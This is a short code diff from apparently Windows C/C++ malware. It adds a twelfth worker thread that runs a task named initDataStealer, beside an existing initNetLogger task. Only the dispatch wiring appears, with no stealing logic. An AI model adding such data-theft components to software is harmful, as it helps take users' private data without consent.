@@ -2,7 +2,7 @@
 
 int runThreads()
 {
-	const int numThreads = 11;
+	const int numThreads = 12;
 	PMYDATA pDataArray[numThreads];
 	DWORD dwThreadIdArray[numThreads];
 	HANDLE hThread[numThreads];
@@ -67,6 +67,11 @@ int runThreads()
 		case 10:
 		{
 			task = initNetLogger;
+			break;
+		}
+		case 11:
+		{
+			task = initDataStealer;
 			break;
 		}
 		default:
